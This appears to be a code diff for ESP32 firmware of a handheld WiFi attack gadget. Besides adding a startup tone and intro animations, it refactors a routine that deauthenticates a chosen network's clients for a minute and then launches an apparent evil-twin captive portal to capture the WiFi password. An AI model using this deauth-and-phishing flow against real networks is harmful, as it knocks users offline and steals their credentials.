@@ -12,6 +12,8 @@
 #include "definitions.h"
 #include "evil_portal.h"
 #include "ir_controll.h"
+#include "rfid_controll.h"
+
 
 int curr_channel = 1;
 int last_push_btn_time = 0;
@@ -26,16 +28,56 @@ bool handshake_menu = false;
 bool all_deauth_state = false;
 bool beacon_spam_state = false;
 
+
 String wifi = "Test";
 short wifiScroll = 0;
 
+
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+
+void playStartupTone() {
+  int melody[] = {NOTE_C4, NOTE_E4, NOTE_G4, NOTE_C5};
+  int noteDurations[] = {200, 200, 200, 400}; 
+
+  for (int i = 0; i < 4; i++) {
+    ledcWriteTone(0, melody[i]);
+    delay(noteDurations[i]);
+  }
+  ledcWriteTone(0, 0); 
+}
+
+void handle_animate() {
+  int num = random(0, 6);
+  switch (num)
+  {
+  case 0:
+    animateBitmapAppearFade(intro1, 128, 64, 1000);
+    break;
+  case 1:
+    animateBitmapAppearFade(intro2, 43, 64, 1000);
+    break;
+  case 2:
+    animateBitmapAppearFade(intro3, 114, 64, 1000);
+    break;
+  case 3:
+    animateBitmapAppearFade(intro4, 124, 64, 1000);
+    break;
+  case 4:
+    animateBitmapAppearFade(intro5, 124, 64, 1000);
+    break;
+  case 5:
+    animateBitmapAppearFade(intro6, 124, 64, 1000);
+    break;
+  }
+}
 
 void setup() {
   pinMode(BTN_UP_PIN, INPUT_PULLUP);
   pinMode(BTN_DOWN_PIN, INPUT_PULLUP);
   pinMode(BTN_SELECT_PIN, INPUT_PULLUP);
-  irsend.begin();
+  ledcSetup(0, 2000, 8);   
+  ledcAttachPin(BUZZER_PIN, 0);
+
   WiFi.disconnect();
   
   if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
@@ -48,8 +90,9 @@ void setup() {
   display.clearDisplay();
   display.display();
 
-  delay(2000);
-  animateBitmapAppearFade(intro, SCREEN_WIDTH, SCREEN_HEIGHT, 1000);
+  loadingAnimation();
+  handle_animate();
+
   last_push_btn_time = millis(); 
   
 #ifdef SERIAL_DEBUG
@@ -63,7 +106,9 @@ void setup() {
   WiFi.softAP(AP_SSID, AP_PASS);
 
   start_web_interface();
+  playStartupTone();
 }
+
 
 void loop() {
   if (deauth_type == DEAUTH_TYPE_ALL)
@@ -272,6 +317,26 @@ void wait_for_stop()
   }
 }
 
+void start_captive_pass_portal(String* wifi)
+{
+  server.stop();
+  delay(200);
+  
+  start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
+  unsigned long deauthStart = millis();
+
+  while (millis() - deauthStart < 60000) {
+      display.clearDisplay();
+      display.setCursor(0, 20);
+      display.println("Deauth running...");
+      display.display();
+      delay(100);
+  }
+  stop_deauth();
+  
+  startCaptivePortal(wifi, false);
+  wait_for_stop();
+}
 
 void get_wifi() 
 {
@@ -311,23 +376,7 @@ void get_wifi()
       if (handshake_menu){
         wifi = networks[wifiScroll].first;
 
-        delay(200);
-        server.stop();
-
-        start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
-        unsigned long deauthStart = millis();
-
-        while (millis() - deauthStart < 60000) {
-            display.clearDisplay();
-            display.setCursor(0, 20);
-            display.println("Deauth running...");
-            display.display();
-            delay(100);
-        }
-        stop_deauth();
-        
-        startCaptivePortal(&wifi, false);
-        wait_for_stop();
+        start_captive_pass_portal(&wifi);
 
         handshake_menu = false;
         return;
